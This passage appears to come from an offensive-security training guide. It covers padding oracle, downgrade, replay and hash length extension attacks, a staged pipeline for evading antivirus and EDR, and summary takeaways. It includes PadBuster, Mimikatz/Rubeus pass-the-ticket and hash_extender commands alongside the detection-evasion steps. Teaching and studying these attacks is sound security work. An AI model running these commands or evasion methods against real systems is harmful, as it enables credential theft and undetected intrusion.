4. By trying all 256 values, you find the one that produces valid padding
5. This tells you the plaintext byte (XOR math)
6. Repeat for every byte in every block
```

**Tools**: `PadBuster` automates this. It's slow (up to 256 requests
per byte) but it works against any application that leaks padding
validity.

```bash
# PadBuster example
padbuster <target_url> <encrypted_cookie> <block_size> -cookies "auth=<value>"
```

**Where you'll see this**: Encrypted cookies, encrypted URL parameters,
any application using CBC mode where the server's error behavior differs
based on padding validity. ASP.NET had a famous padding oracle
vulnerability (CVE-2010-3332).

### Downgrade Attacks

Force a connection to use a weaker protocol version or cipher suite.

**TLS downgrade**: Intercept the TLS handshake and modify the
ClientHello to remove strong cipher suites. The server falls back to
a weaker cipher that you can break. POODLE (CVE-2014-3566) attacked
SSLv3 this way. Modern TLS 1.3 eliminates most downgrade paths.

**NTLM downgrade**: Force NTLMv1 authentication instead of NTLMv2.
NTLMv1 hashes are crackable with rainbow tables. Modify the
`LmCompatibilityLevel` on a compromised server, or use a rogue server
that requests NTLMv1.

**Kerberos downgrade**: Request RC4 encryption for Kerberos tickets
instead of AES. RC4-encrypted tickets are crackable. This is the
basis of Kerberoasting — you request a TGS for a service account and
specify RC4 encryption type. The DC obliges, and now you have a hash
you can crack offline.

### Replay Attacks

Capture a valid authentication exchange and replay it later. The server
sees valid credentials and grants access.

**Where replay works**: Protocols without timestamps, nonces, or sequence
numbers in their authentication. Kerberos tickets can be replayed
within their validity window (typically 10 hours). NTLM challenges
include a timestamp but the window is usually 30 minutes.

**Pass-the-Ticket**: Export a Kerberos TGT from one machine, import it
on another. You're "replaying" the ticket. The KDC doesn't know or care
which machine presents it.

```bash
# Export TGT from compromised machine (Mimikatz)
sekurlsa::tickets /export

# Import on attacker machine (Rubeus)
Rubeus.exe ptt /ticket:ticket.kirbi

# Now you have the user's Kerberos identity
# All network access uses their credentials
```

### Hash Length Extension

If a server computes `HMAC = H(secret || message)` using a
Merkle-Damgard hash (MD5, SHA-1, SHA-256), you can EXTEND the hash
without knowing the secret. You append data to the message and compute
a valid hash for the extended message.

**Where you'll see it**: Custom authentication schemes that concatenate
a secret key with user-controlled data before hashing. The fix is to
use HMAC (which double-hashes with the key) instead of raw
`H(key || data)`.

```bash
# hash_extender tool
hash_extender --data "original_data" --secret-min 10 --secret-max 30 \
    --append "admin=true" --signature <original_hash> --format sha256
```

---

## Putting It Together — The Evasion Pipeline

Real-world payload delivery isn't one technique — it's a pipeline.
Each stage strips away one detection layer:

```
Stage 0: Raw shellcode (msfvenom, custom, Cobalt Strike)
   ↓ Caught by: everything
Stage 1: AES-encrypt the shellcode
   ↓ Defeats: static signature matching
Stage 2: Build loader with API obfuscation + dynamic resolution
   ↓ Defeats: string-based heuristics
Stage 3: Add environment checks (sandbox detection)
   ↓ Defeats: automated sandbox analysis
Stage 4: Use direct/indirect syscalls for memory operations
   ↓ Defeats: ntdll.dll API hooking (EDR userland hooks)
Stage 5: Execute via callback or thread hijack
   ↓ Defeats: CreateThread-based behavioral detection
Stage 6: Encrypt payload in memory during sleep cycles
   ↓ Defeats: memory scanning
Stage 7: C2 over HTTPS with malleable profile
   ↓ Defeats: network traffic analysis

Result: Payload executes on a modern, fully-patched Windows endpoint
with up-to-date EDR. Not guaranteed — but each stage multiplies the
difficulty for defenders.
```

**The arms race is real**: Defenders adapt. Every technique has a
detection method. Direct syscalls? EDR monitors at the kernel level
with ETW (Event Tracing for Windows). Callback execution? They
enumerate callback registrations. Module stomping? They compare
in-memory images to on-disk files. Encrypted sleep? They periodically
dump and scan between encryption cycles.

There is no permanent bypass. There is only the current gap between
what you do and what they check. Your job is to stay ahead of that
gap — not by learning one trick, but by understanding the MECHANISMS
well enough to improvise when the playbook stops working.

---

## Summary — Key Takeaways

- **Encoding is not encryption.** Base64, hex, URL encoding — all
  reversible without a key. Defender decodes base64 trivially. Never
  rely on encoding for evasion.

- **XOR with a short key is broken.** Defender XOR-decrypts with common
  key lengths and checks results against signatures. AES with a random
  key per payload is the minimum standard for payload encryption.

- **NTLM hashes are as good as passwords.** Pass-the-hash, pass-the-ticket,
  and relay attacks mean you often don't need to crack anything. The hash
  or ticket IS the credential.

- **Static evasion is the easy part.** Encrypt the payload and signatures
  can't match. The hard part is behavioral and heuristic evasion —
  changing HOW your code executes so it doesn't trigger pattern-based
  detection.

- **Direct syscalls bypass userland hooks.** EDR hooks ntdll.dll. Direct
  syscalls skip ntdll entirely. Indirect syscalls do the same while hiding
  the fact that you're making direct syscalls. Hell's Gate and Halo's Gate
  resolve SSNs at runtime.

- **The evasion pipeline is layered.** No single technique defeats all
  detection. Stack encryption + obfuscation + sandbox detection + syscalls +
  alternative execution + memory encryption + encrypted C2. Each layer
  defeats one detection mechanism.

- **Process injection has many forms.** Process hollowing, early bird,
  thread hijack, module stomping, callback execution — each has different
  detection signatures. Knowing multiple techniques means you can rotate
  when one gets caught.

- **Hash cracking is a GPU problem.** NTLM cracks at billions per second
  on modern GPUs. NTLMv2 and Kerberoast hashes are slower but still
  crackable with good wordlists and rules. Know your hashcat modes.

- **Crypto attacks exist at the protocol level.** Padding oracles,
  downgrade attacks, replay attacks, hash length extension. You won't
  implement these often, but you need to recognize when a target is
  vulnerable to them.

- **There is no permanent bypass.** The arms race between offense and
  defense is continuous. Understanding the MECHANISMS — not just the
  techniques — is what lets you adapt when the current playbook gets
  burned.
